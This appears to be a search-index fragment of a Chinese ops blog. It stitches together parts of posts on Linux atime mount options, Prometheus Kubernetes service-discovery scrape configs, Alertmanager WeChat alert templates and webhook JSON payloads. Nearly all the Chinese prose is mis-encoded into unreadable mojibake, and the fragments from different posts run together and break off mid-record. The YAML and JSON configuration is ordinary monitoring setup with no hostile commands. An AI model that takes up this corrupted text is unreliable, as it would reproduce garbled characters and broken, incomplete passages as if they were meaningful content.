å¦‚æœä½¿ç”¨relatimeï¼Œè¡¨ç¤ºå½“atimeæ¯”ctimeæˆ–mtimeæ›´æ—©ï¼Œç„¶åä½ åˆå»è¯»å–äº†æ–‡ä»¶ï¼Œatimeæ‰ä¼šè¢«æ›´æ–°ä¸ºå½“å‰æ—¶é—´ï¼Œkernel2.6.30åçš„é»˜è®¤è¡Œä¸ºï¼›æˆ–è€…atimeæ¯”ç°åœ¨æ—©ä¸€å¤©ï¼Œé‚£ä¹ˆatimeåœ¨æ–‡ä»¶è¯»å–æ—¶ä¼šè¢«æ›´æ–° å¦‚æœä½¿ç”¨strictatimeï¼Œatimeåœ¨æ–‡ä»¶æ¯æ¬¡è¢«è¯»å–æ—¶ï¼Œéƒ½èƒ½å¤Ÿè¢«æ›´æ–° cat /proc/mountså¯ä»¥çœ‹åˆ°æˆ‘çš„æœåŠ¡å™¨ä½¿ç”¨çš„æ˜¯relatimeå‚æ•°ï¼š /dev/sdl1 /home ext4 rw,relatime,user_xattr,barrier=1,data=ordered 0 0 å®éªŒç¯èŠ‚ï¼š noatimeï¼Œå¯ä»¥çœ‹åˆ°ä¸ç®¡æ˜¯ä¿®æ”¹æ–‡ä»¶è¿˜æ˜¯è¯»å–æ–‡ä»¶ï¼Œatimeéƒ½ä¸ä¼šå˜åŒ–ï¼Œæ€§èƒ½æœ€å¥½ $ sudo mount -t tmpfs -o noatime tmpfs /mnt $ cd /mnt /mnt$ echo \"hello world\" \u003e\u003e foo.c /mnt$ stat foo.c File: `foo.c' Size: 12 Blocks: 8 IO Block: 4096 regular file Device: 18h/24d Inode: 60855528 Links: 1 Access: (0644/-rw-r--r--) Uid: (xxxxxx) Gid: ( 100/ users) \u003cspan style=\"color:#ff0000;\"\u003eAccess: 2016-04-11 17:46:19.734162324 +0800 #æœ€åˆå€¼\u003c/span\u003e Modify: 2016-04-11 17:46:19.734162324 +0800 Change: 2016-04-11 17:46:19.734162324 +0800 Birth: - /mnt$ echo \"hello world\" \u003e\u003e foo.c /mnt$ stat foo.c File: `foo.c' Size: 24 Blocks: 8 IO Block: 4096 regular file Device: 18h/24d Inode: 60855528 Links: 1 Access: (0644/-rw-r--r--) Uid: (xxxxxx) Gid: ( 100/ users) \u003cspan style=\"color:#ff0000;\"\u003eAccess: 2016-04-11 17:46:19.734162324 +0800 #å†™æ–‡ä»¶åï¼Œatimeä¸å˜\u003c/span\u003e Modify: 2016-04-11 17:46:38.142096924 +0800 Change: 2016-04-11 17:46:38.142096924 +0800 Birth: - /mnt$ cat foo.c hello world hello world /mnt$ stat foo.c File: `foo.c' Size: 24 Blocks: 8 IO Block: 4096 regular file Device: 18h/24d Inode: 60855528 Links: 1 Access: (0644/-rw-r--r--) Uid: (xxxxxx) Gid: ( 100/ users) \u003cspan style=\"color:#ff0000;\"\u003eAccess: 2016-04-11 17:46:19.734162324 +0800 #è¯»æ–‡ä»¶åï¼Œatimeä¸å˜\u003c/span\u003e Modify: 2016-04-11 17:46:38.142096924 +0800 Change: 2016-04-11 17:46:38.142096924 +0800 Birth: - /mnt$ cd $ sudo umount /mnt relatimeï¼Œå½“atimeæ—©äºæˆ–ç­‰äºmtime/ctimeæ—¶ï¼Œæ‰ä¼šè¢«æ›´æ–°ï¼Œ2.6.30åçš„å†…æ ¸çš„é»˜è®¤è¡Œä¸ºï¼Œæ€§èƒ½å’ŒatimeæŠ˜ä¸­çš„é€‰æ‹© $ sudo mount -t tmpfs -o relatime tmpfs /mnt $ cd /mnt /mnt$ echo \"hello world\" \u003e\u003e foo.c /mnt$ stat foo.c File: `foo.c' Size: 12 Blocks: 8 IO Block: 4096 regular file Device: 19h/25d Inode: 60855680 Links: 1 ","date":"2021-01-11 15:41","objectID":"/post/2184/:0:0","tags":["linux"],"title":"ä¸ºä»€ä¹ˆæœ‰æ—¶å€™è¯»å–æ–‡ä»¶ï¼Œatimeä¸æ›´æ–°","uri":"/post/2184/"},{"categories":["ç›‘æ§"],"content":"kubernetes_sd_configé€šè¿‡å‘ç°k8sä¸­å„ç§å¯¹è±¡çš„IPåœ°å€ç«¯å£ç­‰ä¿¡æ¯,ä½œä¸ºtargetæ¥æŠ“å–ã€‚ å¯ä»¥é…ç½®ä»¥ä¸‹è§’è‰²ç±»å‹æ¥è·å–ä¸åŒå¯¹è±¡çš„ipå’Œportç­‰ä¿¡æ¯: ","date":"2021-01-04 18:30","objectID":"/post/2180/:0:0","tags":["k8s","prometheus"],"title":"prometheusç›‘æ§kubernetesé›†ç¾¤é…ç½®è¯¦è§£(ä¸ƒ)","uri":"/post/2180/"},{"categories":["ç›‘æ§"],"content":"ä¸€ã€è§’è‰²ç±»å‹ ","date":"2021-01-04 18:30","objectID":"/post/2180/:1:0","tags":["k8s","prometheus"],"title":"prometheusç›‘æ§kubernetesé›†ç¾¤é…ç½®è¯¦è§£(ä¸ƒ)","uri":"/post/2180/"},{"categories":["ç›‘æ§"],"content":"1. node nodeè§’è‰²å¯ä»¥å‘ç°é›†ç¾¤ä¸­æ¯ä¸ªnodeèŠ‚ç‚¹çš„åœ°å€ç«¯å£ï¼Œé»˜è®¤ä¸ºKubeletçš„HTTPç«¯å£ã€‚ç›®æ ‡åœ°å€é»˜è®¤ä¸ºKubernetesèŠ‚ç‚¹å¯¹è±¡çš„ç¬¬ä¸€ä¸ªç°æœ‰åœ°å€ï¼Œåœ°å€ç±»å‹é¡ºåºä¸ºNodeInternalIPã€NodeExternalIPã€NodeLegacyHostIPå’ŒNodeHostNameã€‚ å¯ç”¨æ ‡ç­¾ __meta_kubernetes_node_name: nodeèŠ‚ç‚¹çš„åç§° __meta_kubernetes_node_label_\u003clabelname\u003e: k8sä¸­nodeèŠ‚ç‚¹çš„æ ‡ç­¾.\u003clabelname\u003eä»£è¡¨æ ‡ç­¾åç§° __meta_kubernetes_node_labelpresent_\u003clabelname\u003e: æ ‡ç­¾å­˜åœ¨åˆ™ä¸ºtrue.\u003clabelname\u003eä»£è¡¨æ ‡ç­¾åç§° __meta_kubernetes_node_annotation_\u003cannotationname\u003e: k8sä¸­nodeèŠ‚ç‚¹çš„æ³¨è§£.\u003cannotationname\u003eä»£è¡¨æ³¨è§£åç§° __meta_kubernetes_node_annotationpresent_\u003cannotationname\u003e: æ³¨è§£å­˜åœ¨åˆ™ä¸ºtrue.\u003cannotationname\u003eä»£è¡¨æ³¨è§£åç§° __meta_kubernetes_node_address_\u003caddress_type\u003e: ä¸åŒç±»å‹çš„nodeèŠ‚ç‚¹åœ°å€,ä¾‹å¦‚: _meta_kubernetes_node_address_Hostname=\"test-k8s-node1\" _meta_kubernetes_node_address_InternalIP=\"10.0.0.11\" instance: ä»apiserverè·å–åˆ°çš„èŠ‚ç‚¹åç§° ","date":"2021-01-04 18:30","objectID":"/post/2180/:1:1","tags":["k8s","prometheus"],"title":"prometheusç›‘æ§kubernetesé›†ç¾¤é…ç½®è¯¦è§£(ä¸ƒ)","uri":"/post/2180/"},{"categories":["ç›‘æ§"],"content":"2. service serviceè§’è‰²å¯ä»¥å‘ç°æ¯ä¸ªserviceçš„ipå’Œport,å°†å…¶ä½œä¸ºtargetã€‚è¿™å¯¹äºé»‘ç›’ç›‘æ§(blackbox)å¾ˆæœ‰ç”¨ å¯ç”¨æ ‡ç­¾ __meta_kubernetes_namespace: serviceæ‰€åœ¨çš„å‘½åç©ºé—´ __meta_kubernetes_service_annotation_\u003cannotationname\u003e: k8sä¸­serviceçš„æ³¨è§£ __meta_kubernetes_service_annotationpresent_\u003cannotationname\u003e: æ³¨è§£å­˜åœ¨åˆ™ä¸ºtrue __meta_kubernetes_service_cluster_ip: k8sä¸­serviceçš„clusterIP __meta_kubernetes_service_external_name: k8sä¸­serviceçš„external_name __meta_kubernetes_service_label_\u003clabelname\u003e: k8sä¸­serviceçš„æ ‡ç­¾ __meta_kubernetes_service_labelpresent_\u003clabelname\u003e: æ ‡ç­¾å­˜åœ¨åˆ™ä¸ºtrue __meta_kubernetes_service_name: k8sä¸­serviceçš„åç§° __meta_kubernetes_service_port_name: k8sä¸­serviceçš„ç«¯å£ __meta_kubernetes_service_port_protocol: k8sä¸­serviceçš„ç«¯å£åè®® __meta_kubernetes_service_type: k8sä¸­serviceçš„ç±»å‹ ","date":"2021-01-04 18:30","objectID":"/post/2180/:1:2","tags":["k8s","prometheus"],"title":"prometheusç›‘æ§kubernetesé›†ç¾¤é…ç½®è¯¦è§£(ä¸ƒ)","uri":"/post/2180/"},{"categories":["ç›‘æ§"],"content":"3. pod podè§’è‰²å¯ä»¥å‘ç°æ‰€æœ‰podå¹¶å°†å…¶ä¸­çš„pod ipä½œä¸ºtargetã€‚å¦‚æœæœ‰å¤šä¸ªç«¯å£æˆ–è€…å¤šä¸ªå®¹å™¨ï¼Œå°†ç”Ÿæˆå¤šä¸ªtarget(ä¾‹å¦‚:80,443è¿™ä¸¤ä¸ªç«¯å£,pod ipä¸º10.0.244.22,åˆ™å°†10.0.244.22:80,10.0.244.22:443åˆ†åˆ«ä½œä¸ºæŠ“å–çš„target)ã€‚ å¦‚æœå®¹å™¨æ²¡æœ‰æŒ‡å®šçš„ç«¯å£ï¼Œåˆ™ä¼šä¸ºæ¯ä¸ªå®¹å™¨åˆ›å»ºä¸€ä¸ªæ— ç«¯å£targetï¼Œä»¥ä¾¿é€šè¿‡relabelæ‰‹åŠ¨æ·»åŠ ç«¯å£ã€‚ __meta_kubernetes_namespace: podæ‰€åœ¨çš„å‘½åç©ºé—´ __meta_kubernetes_pod_name: podçš„åç§° __meta_kubernetes_pod_ip: podçš„ip __meta_kubernetes_pod_label_\u003clabelname\u003e: podçš„æ ‡ç­¾ __meta_kubernetes_pod_labelpresent_\u003clabelname\u003e: æ ‡ç­¾å­˜åœ¨åˆ™ä¸ºtrue __meta_kubernetes_pod_annotation_\u003cannotationname\u003e: podçš„æ³¨è§£ __meta_kubernetes_pod_annotationpresent_\u003cannotationname\u003e: æ³¨è§£å­˜åœ¨åˆ™ä¸ºtrue __meta_kubernetes_pod_container_init: å¦‚æœå®¹å™¨æ˜¯InitContainerï¼Œåˆ™ä¸ºtrue __meta_kubernetes_pod_container_name: å®¹å™¨çš„åç§° __meta_kubernetes_pod_container_port_name: å®¹å™¨çš„ç«¯å£åç§° __meta_kubernetes_pod_container_port_number: å®¹å™¨çš„ç«¯å£å· __meta_kubernetes_pod_container_port_protocol: å®¹å™¨çš„ç«¯å£åè®® __meta_kubernetes_pod_ready: podçš„å°±ç»ªçŠ¶æ€ï¼Œtrueæˆ–falseã€‚ __meta_kubernetes_pod_phase: podçš„ç”Ÿå‘½å‘¨æœŸçŠ¶æ€.Pending, Running, Succeeded, Failed or Unknown __meta_kubernetes_pod_node_name: podæ‰€åœ¨nodeèŠ‚ç‚¹åç§° __meta_kubernetes_pod_host_ip: podæ‰€åœ¨nodeèŠ‚ç‚¹ip __meta_kubernetes_pod_uid: podçš„uid __meta_kubernetes_pod_controller_kind: podæ§åˆ¶å™¨çš„ç±»å‹ReplicaSet ,DaemonSet,Job,StatefulSetâ€¦ __meta_kubernetes_pod_controller_name: podæ§åˆ¶å™¨çš„åç§° ","date":"2021-01-04 18:30","objectID":"/post/2180/:1:3","tags":["k8s","prometheus"],"title":"prometheusç›‘æ§kubernetesé›†ç¾¤é…ç½®è¯¦è§£(ä¸ƒ)","uri":"/post/2180/"},{"categories":["ç›‘æ§"],"content":"4. endpoints endpointsè§’è‰²å¯ä»¥ä»epåˆ—è¡¨ä¸­å‘ç°targetã€‚å¯¹äºæ¯ä¸ªepåœ°å€å’Œç«¯å£éƒ½ä¼šå‘ç°targetã€‚å¦‚æœç«¯ç‚¹ç”±Podæ”¯æŒï¼Œåˆ™è¯¥Podçš„æ‰€æœ‰å…¶ä»–å®¹å™¨ç«¯å£ï¼ˆæœªç»‘å®šåˆ°ç«¯ç‚¹ç«¯å£ï¼‰ä¹Ÿå°†ä½œä¸ºç›®æ ‡ã€‚ å¯ç”¨æ ‡ç­¾ __meta_kubernetes_namespace : epå¯¹è±¡æ‰€åœ¨çš„å‘½åç©ºé—´ __meta_kubernetes_endpoints_name : epçš„åç§° ç›´æ¥ä»epå¯¹è±¡çš„åˆ—è¡¨ä¸­è·å–çš„æ‰€æœ‰targetï¼Œä¸‹é¢çš„æ ‡ç­¾å°†ä¼šè¢«é™„åŠ ä¸Š __meta_kubernetes_endpoint_hostname: epçš„ä¸»æœºå __meta_kubernetes_endpoint_node_name: epçš„nodeèŠ‚ç‚¹å __meta_kubernetes_endpoint_ready: epçš„å°±ç»ªçŠ¶æ€ï¼Œtrueæˆ–falseã€‚ __meta_kubernetes_endpoint_port_name: epçš„ç«¯å£åç§° __meta_kubernetes_endpoint_port_protocol: epçš„ç«¯å£åè®® __meta_kubernetes_endpoint_address_target_kind: epå¯¹è±¡çš„ç›®æ ‡ç±»å‹ï¼Œæ¯”å¦‚Pod __meta_kubernetes_endpoint_address_target_name: epå¯¹è±¡çš„ç›®æ ‡åç§°ï¼Œæ¯”å¦‚podåç§° å¦‚æœepæ˜¯å±äºserviceçš„è¯,åˆ™ä¼šé™„åŠ serviceè§’è‰²çš„æ‰€æœ‰æ ‡ç­¾ å¯¹äºepçš„åç«¯èŠ‚ç‚¹æ˜¯podï¼Œåˆ™ä¼šé™„åŠ podè§’è‰²çš„æ‰€æœ‰æ ‡ç­¾(å³ä¸Šè¾¹ä»‹ç»çš„podè§’è‰²å¯ç”¨æ ‡ç­¾) æ¯”å¦‚æˆ‘ä¹ˆæ‰‹åŠ¨åˆ›å»ºä¸€ä¸ªepï¼Œè¿™ä¸ªepå…³è”åˆ°ä¸€ä¸ªpodï¼Œåˆ™prometheusçš„æ ‡ç­¾ä¸­ä¼šåŒ…å«è¿™ä¸ªpodè§’è‰²çš„æ‰€æœ‰æ ‡ç­¾ apiVersion: v1 kind: Endpoints metadata: name: ep-test subsets: - addresses: - ip: 10.244.3.18 nodeName: test-k8s-node3 targetRef: kind: Pod name: mysql-hcrr6 namespace: default ports: - name: mysql port: 3306 ","date":"2021-01-04 18:30","objectID":"/post/2180/:1:4","tags":["k8s","prometheus"],"title":"prometheusç›‘æ§kubernetesé›†ç¾¤é…ç½®è¯¦è§£(ä¸ƒ)","uri":"/post/2180/"},{"categories":["ç›‘æ§"],"content":"5. ingress ingressè§’è‰²å‘ç°ingressçš„æ¯ä¸ªè·¯å¾„çš„targetã€‚è¿™é€šå¸¸å¯¹é»‘ç›’ç›‘æ§å¾ˆæœ‰ç”¨ã€‚è¯¥åœ°å€å°†è®¾ç½®ä¸ºingressä¸­æŒ‡å®šçš„hostã€‚ å¯ç”¨æ ‡ç­¾ __meta_kubernetes_namespace: ingressæ‰€åœ¨çš„å‘½åç©ºé—´ __meta_kubernetes_ingress_name: ingressçš„åç§° __meta_kubernetes_ingress_label_\u003clabelname\u003e: ingressçš„æ ‡ç­¾ __meta_kubernetes_ingress_labelpresent_\u003clabelname\u003e: æ ‡ç­¾å­˜åœ¨åˆ™ä¸ºtrue __meta_kubernetes_ingress_annotation_\u003cannotationname\u003e: ingressçš„æ³¨è§£ __meta_kubernetes_ingress_annotationpresent_\u003cannotationname\u003e: æ³¨è§£å­˜åœ¨åˆ™ä¸ºtrue __meta_kubernetes_ingress_scheme: ingressçš„åè®®ï¼Œå¦‚æœè®¾ç½®äº†tlsåˆ™æ˜¯https,é»˜è®¤http __meta_kubernetes_ingress_path: ingressä¸­æŒ‡å®šçš„çš„è·¯å¾„ã€‚é»˜è®¤ä¸º/ ","date":"2021-01-04 18:30","objectID":"/post/2180/:1:5","tags":["k8s","prometheus"],"title":"prometheusç›‘æ§kubernetesé›†ç¾¤é…ç½®è¯¦è§£(ä¸ƒ)","uri":"/post/2180/"},{"categories":["ç›‘æ§"],"content":"äºŒã€é…ç½®æ–‡ä»¶: # æŠ“å–æŒ‡æ ‡é…ç½® # æŠ“å–é…ç½® scrape_configs: # ä»»åŠ¡åç§° - job_name: node_exporter kubernetes_sd_configs: # é€šè¿‡nodeè§’è‰²å‘ç°ç›®æ ‡ipç«¯å£ - role: node # é‡å†™æ ‡ç­¾ relabel_configs: # å°†ç›®æ ‡åœ°å€çš„ç«¯å£æ”¹ä¸ºnode_exporterçš„ç«¯å£ - source_labels: [__address__] regex: \"(.*):10250\" target_label: __address__ replacement: \"${1}:9100\" # å°†æ­£åˆ™åŒ¹é…çš„æ ‡ç­¾åç§°ï¼Œæ›¿æ¢åŸæ ‡ç­¾åç§°.(replacementé»˜è®¤æ˜¯$1),ä¸‹é¢çš„å†…å®¹å°±ç›¸å½“äºå°†`__meta_kubernetes_node_label_xxxx`æ›¿æ¢ä¸ºxxxx - action: labelmap regex: \"__meta_kubernetes_node_label_(.*)\" # ä»»åŠ¡åç§°ï¼Œè¿™é‡ŒæŠ“å–çš„æ˜¯kubeletçš„æŒ‡æ ‡(é»˜è®¤10250ç«¯å£)ï¼Œå¯ä»¥é€šè¿‡curlè·å–: curl -k 'https://localhost:10250/metrics' --header 'Authorization: Bearer xxxxx' - job_name: 'kubernetes-kubelet' # æŒ‡å®šé€šè¿‡httpsè¿˜æ˜¯httpæŠ“å–æŒ‡æ ‡ï¼Œé»˜è®¤http scheme: https tls_config: # ç”¨äºéªŒè¯APIæœåŠ¡å™¨è¯ä¹¦çš„CAè¯ä¹¦ã€‚ ca_file: /var/run/secrets/kubernetes.io/serviceaccount/ca.crt # å¦‚æœè¯ä¹¦æ˜¯è‡ªç­¾åçš„,åˆ™éœ€è¦è·³è¿‡æ ¡éªŒ insecure_skip_verify: true # è®¿é—®metric apiçš„tokenï¼Œè¿™é‡Œå¯¹åº”çš„å°±æ˜¯k8sçš„serviceaccountï¼Œæƒé™å¯è‡ªè¡Œé…ç½® bearer_token_file: /var/run/secrets/kubernetes.io/serviceaccount/token kubernetes_sd_configs: - role: node relabel_configs: - action: labelmap regex: __meta_kubernetes_node_label_(.+) # è¿™é‡ŒæŠ“å–çš„æ˜¯cadvisoræŒ‡æ ‡ï¼Œæä¾›å®¹å™¨ç›¸å…³çš„æŒ‡æ ‡ - job_name: 'kubernetes-cadvisor' kubernetes_sd_configs: - role: node scheme: https tls_config: ca_file: /var/run/secrets/kubernetes.io/serviceaccount/ca.crt insecure_skip_verify: true bearer_token_file: /var/run/secrets/kubernetes.io/serviceaccount/token relabel_configs: - action: labelmap regex: __meta_kubernetes_node_label_(.+) # ä¿®æ”¹__metrics_path__æ ‡ç­¾ï¼Œä¼šæ”¹å˜metricsçš„æŠ“å–è·¯å¾„ã€‚ä¹Ÿå¯ä»¥ä½¿ç”¨kubelet-ip:10250/metrics/cadvisoræ¥æŠ“å– - action: replace source_labels: [__meta_kubernetes_node_name] regex: (.*) target_label: __metrics_path__ replacement: /api/v1/nodes/${1}/proxy/metrics/cadvisor - action: replace source_labels: [__address__] target_label: __address__ replacement: kubernetes.default.svc:443 metric_relabel_configs: - regex: kernelVersion action: labeldrop # ç›‘æ§api-server - job_name: 'kubernetes-api-services' scheme: https tls_config: ca_file: /var/run/secrets/kubernetes.io/serviceaccount/ca.crt bearer_token_file: /var/run/secrets/kubernetes.io/serviceaccount/token kubernetes_sd_configs: - role: endpoints relabel_configs: - action: replace source_labels: [__address__] target_label: __address__ replacement: kubernetes.default:443 - action: keep source_labels: [__meta_kubernetes_namespace,__meta_kubernetes_endpoint_port_name,__meta_kubernetes_service_name] regex: default;https;kubernetes - action: labelmap regex: __meta_kubernetes_(.+) # è·å–kube-state-metricsæä¾›çš„æŒ‡æ ‡ - job_name: 'kubernetes-service-endpoints' kubernetes_sd_configs: - role: endpoints relabel_configs: # ä¿ç•™__meta_kubernetes_service_annotation_prometheus_io_scrape=trueçš„æ ‡ç­¾ - source_labels: [__meta_kubernetes_service_annotation_prometheus_io_scrape] action: keep regex: true # å°†__address__çš„ç«¯å£æ›¿æ¢ä¸ºæ³¨è§£ä¸­æŒ‡å®šçš„ç«¯å£ - action: replace source_labels: [__address__,__meta_kubernetes_service_annotation_prometheus_io_port] target_label: __address__ regex: (.*?):(\\d+);(\\d+) replacement: ${1}:${3} # è·å–scheme,å¹¶å°†åŒ¹é…çš„ç»“æœå†™å…¥__scheme__æ ‡ç­¾ä¸­ - action: replace source_labels: [__meta_kubernetes_service_annotation_prometheus_io_scheme] target_label: __scheme__ regex: (https?) # å°†__metrics_path__çš„ç»“æœæ›¿æ¢ä¸ºæ³¨è§£ä¸­çš„metricsæŒ‡å®šçš„è·¯å¾„ - source_labels: [__meta_kubernetes_service_annotation_prometheus_io_path] action: replace target_label: __metrics_path__ regex: (.+) - action: labelmap regex: __meta_kubernetes_service_label_(.+) - source_labels: [__meta_kubernetes_namespace] action: replace target_label: kubernetes_namespace - source_labels: [__meta_kubernetes_service_name] action: replace target_label: kubernetes_name # æŠ“å–nginx-ingressçš„metrics - job_name: 'ingress-nginx' bearer_token_file: /var/run/secrets/kubernetes.io/serviceaccount/token kubernetes_sd_configs: - role: service namespaces: names: - ingress-nginx relabel_configs: - source_labels: [__address__] regex: (.*)10254 action: keep å®˜æ–¹ç¤ºä¾‹Prometheusé…ç½®æ–‡ä»¶ï¼šhttps://github.com/prometheus/prometheus/blob/release-2.23/documentation/examples/prometheus-kubernetes.yml ","date":"2021-01-04 18:30","objectID":"/post/2180/:2:0","tags":["k8s","prometheus"],"title":"prometheusç›‘æ§kubernetesé›†ç¾¤é…ç½®è¯¦è§£(ä¸ƒ)","uri":"/post/2180/"},{"categories":["ç›‘æ§"],"content":"ä¸€ã€promethueså‘Šè­¦é…ç½®: alertingå’Œrulesçš„é…ç½®(æŠ“å–æŒ‡æ ‡éœ€è‡ªè¡Œé…ç½®)ï¼š global: scrape_interval: 15s evaluation_interval: 15s alerting: alertmanagers: - static_configs: - targets: [\"alertmanager:9093\"] rule_files: - \"/etc/prometheus/rules.yml\" /etc/prometheus/rules.ymlçš„é…ç½®ï¼š groups: - name: linux_alert rules: - alert: \"load5è´Ÿè½½é«˜äº5\" for: 20s expr: node_load5 \u003e 5 labels: severity: critical team: ops annotations: description: \"{{ $labels.instance }} é«˜äº5,å½“å‰å€¼:{{ $value }}\" summary: \"load5è´Ÿè½½é«˜äº5\" ","date":"2021-01-04 12:58","objectID":"/post/1604/:1:0","tags":["prometheus","alertmanager"],"title":"alertmanageré…ç½®ä¼ä¸šå¾®ä¿¡å‘Šè­¦(å…­)","uri":"/post/1604/"},{"categories":["ç›‘æ§"],"content":"äºŒã€alertmanageré…ç½® templates: - '/etc/alertmanager/*.tmpl' global: resolve_timeout: 5m route: group_by: ['alertname', 'cluster'] group_wait: 15s group_interval: 1m repeat_interval: 30m receiver: default routes: - receiver: wechat match: severity: critical receivers: - name: 'wechat' wechat_configs: - send_resolved: true api_secret: 'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx' # åœ¨ä¼ä¸šå¾®ä¿¡åå°åº”ç”¨ä¸­æŸ¥çœ‹ corp_id: 'xxxxxxxxxxxxxx' # æˆ‘çš„ä¼ä¸š-ä¼ä¸šä¿¡æ¯-ä¼ä¸šID agent_id: '1000008' # åº”ç”¨i,åœ¨ä¼ä¸šå¾®ä¿¡åå°åº”ç”¨ä¸­æŸ¥çœ‹ to_party: '7' # å‘é€ç»™å“ªä¸ªéƒ¨é—¨,éƒ¨é—¨éœ€è¦å¯¹åº”ç”¨æœ‰æƒé™ message: '{{ template \"wechat.tmpl\" . }}' # å‘é€çš„å†…å®¹,è¿™é‡Œè°ƒç”¨çš„wechat.tmplæ¨¡æ¿ï¼Œåé¢ä¼šå®šä¹‰è¿™ä¸ªæ¨¡æ¿ ","date":"2021-01-04 12:58","objectID":"/post/1604/:2:0","tags":["prometheus","alertmanager"],"title":"alertmanageré…ç½®ä¼ä¸šå¾®ä¿¡å‘Šè­¦(å…­)","uri":"/post/1604/"},{"categories":["ç›‘æ§"],"content":"å‘Šè­¦æ¨¡æ¿ /etc/alertmanager/wechat.tmpl {{ define \"__alert_list\" }}{{ range . -}} å‘Šè­¦åç§°: {{ index .Annotations \"summary\" }} å‘Šè­¦çº§åˆ«: {{ .Labels.severity }} å‘Šè­¦ä¸»æœº: {{ .Labels.instance }} å‘Šè­¦ä¿¡æ¯: {{ index .Annotations \"description\" }} ç»´æŠ¤å›¢é˜Ÿ: {{ .Labels.team | toUpper }} å‘Šè­¦æ—¶é—´: {{ .StartsAt.Format \"2006-01-02 15:04:05\" }} ------------------------------ {{ end -}}{{ end }} {{ define \"__resolved_list\" }}{{ range . -}} å‘Šè­¦åç§°: {{ index .Annotations \"summary\" }} å‘Šè­¦çº§åˆ«: {{ .Labels.severity }} å‘Šè­¦ä¸»æœº: {{ .Labels.instance }} å‘Šè­¦ä¿¡æ¯: {{ index .Annotations \"description\" }} ç»´æŠ¤å›¢é˜Ÿ: {{ .Labels.team | toUpper }} å‘Šè­¦æ—¶é—´: {{ .StartsAt.Format \"2006-01-02 15:04:05\" }} æ¢å¤æ—¶é—´: {{ .EndsAt.Format \"2006-01-02 15:04:05\" }} ------------------------------ {{ end -}}{{ end }} {{ define \"wechat.tmpl\" }} {{- if gt (len .Alerts.Firing) 0 -}} ====ä¾¦æµ‹åˆ°{{ .Alerts.Firing | len }}ä¸ªæ•…éšœ==== {{ template \"__alert_list\" .Alerts.Firing }} {{ end -}} {{- if gt (len .Alerts.Resolved) 0 -}} ====æ¢å¤{{ .Alerts.Resolved | len }}ä¸ªæ•…éšœ==== {{ template \"__resolved_list\" .Alerts.Resolved }} {{- end -}} {{ end }} ","date":"2021-01-04 12:58","objectID":"/post/1604/:2:1","tags":["prometheus","alertmanager"],"title":"alertmanageré…ç½®ä¼ä¸šå¾®ä¿¡å‘Šè­¦(å…­)","uri":"/post/1604/"},{"categories":["ç›‘æ§"],"content":"ä¸‰ã€å‘Šè­¦æ•ˆæœ 75746-9y5p8vha7hr.png ","date":"2021-01-04 12:58","objectID":"/post/1604/:3:0","tags":["prometheus","alertmanager"],"title":"alertmanageré…ç½®ä¼ä¸šå¾®ä¿¡å‘Šè­¦(å…­)","uri":"/post/1604/"},{"categories":["ç›‘æ§"],"content":"å‘Šè­¦ { \"receiver\":\"ops\", \"status\":\"firing\", \"alerts\":[ { \"status\":\"firing\", \"labels\":{ \"alertname\":\"load5è´Ÿè½½é«˜äº5\", \"beta_kubernetes_io_arch\":\"amd64\", \"beta_kubernetes_io_fluentd_ds_ready\":\"true\", \"beta_kubernetes_io_os\":\"linux\", \"instance\":\"test-k8s-master\", \"job\":\"node_exporter\", \"kubernetes_io_arch\":\"amd64\", \"kubernetes_io_hostname\":\"test-k8s-master\", \"kubernetes_io_os\":\"linux\", \"severity\":\"critical\", \"team\":\"ops\" }, \"annotations\":{ \"description\":\"test-k8s-master é«˜äº5,å½“å‰å€¼:0.56\", \"summary\":\"load5è´Ÿè½½é«˜äº5\" }, \"startsAt\":\"2020-12-30T05:04:49.455639638Z\", \"endsAt\":\"0001-01-01T00:00:00Z\", \"generatorURL\":\"http://xxx.com/graph?g0.expr=node_load5+%3E+0\u0026amp;g0.tab=1\" }, { \"status\":\"firing\", \"labels\":{ \"alertname\":\"load5è´Ÿè½½é«˜äº5\", \"beta_kubernetes_io_arch\":\"amd64\", \"beta_kubernetes_io_fluentd_ds_ready\":\"true\", \"beta_kubernetes_io_os\":\"linux\", \"instance\":\"test-k8s-node1\", \"job\":\"node_exporter\", \"kubernetes_io_arch\":\"amd64\", \"kubernetes_io_hostname\":\"test-k8s-node1\", \"kubernetes_io_os\":\"linux\", \"severity\":\"critical\", \"team\":\"ops\" }, \"annotations\":{ \"description\":\"test-k8s-node1 é«˜äº5,å½“å‰å€¼:1.42\", \"summary\":\"load5è´Ÿè½½é«˜äº5\" }, \"startsAt\":\"2020-12-30T05:04:49.455639638Z\", \"endsAt\":\"0001-01-01T00:00:00Z\", \"generatorURL\":\"http://xxx.com/graph?g0.expr=node_load5+%3E+0\u0026amp;g0.tab=1\" }, { \"status\":\"firing\", \"labels\":{ \"alertname\":\"load5è´Ÿè½½é«˜äº5\", \"beta_kubernetes_io_arch\":\"amd64\", \"beta_kubernetes_io_fluentd_ds_ready\":\"true\", \"beta_kubernetes_io_os\":\"linux\", \"instance\":\"test-k8s-node2\", \"job\":\"node_exporter\", \"kubernetes_io_arch\":\"amd64\", \"kubernetes_io_hostname\":\"test-k8s-node2\", \"kubernetes_io_os\":\"linux\", \"severity\":\"critical\", \"team\":\"ops\" }, \"annotations\":{ \"description\":\"test-k8s-node2 é«˜äº5,å½“å‰å€¼:0.16\", \"summary\":\"load5è´Ÿè½½é«˜äº5\" }, \"startsAt\":\"2020-12-30T05:04:49.455639638Z\", \"endsAt\":\"0001-01-01T00:00:00Z\", \"generatorURL\":\"http://xxx.com/graph?g0.expr=node_load5+%3E+0\u0026amp;g0.tab=1\" } ], \"groupLabels\":{ \"alertname\":\"load5è´Ÿè½½é«˜äº5\" }, \"commonLabels\":{ \"alertname\":\"load5è´Ÿè½½é«˜äº5\", \"severity\":\"critical\", \"team\":\"ops\" }, \"commonAnnotations\":{ \"summary\":\"load5è´Ÿè½½é«˜äº5\" }, \"externalURL\":\"http://alertmanager-57fffcb99c-kjhcj:9093\", \"version\":\"4\", \"groupKey\":\"{}/{severity=\\\"critical\\\"}:{alertname=\\\"load5è´Ÿè½½é«˜äº5\\\"}\" } ","date":"2020-12-30 13:08","objectID":"/post/2169/:0:1","tags":["prometheus","alertmanager"],"title":"alertmanager-webhookå‘é€å‘Šè­¦\u0026amp;æ¢å¤ä¿¡æ¯çš„è¯·æ±‚ä½“","uri":"/post/2169/"},{"categories":["ç›‘æ§"],"content":"æ¢å¤ { \"receiver\":\"ops\", \"status\":\"resolved\", \"alerts\":[ { \"status\":\"resolved\", \"labels\":{ 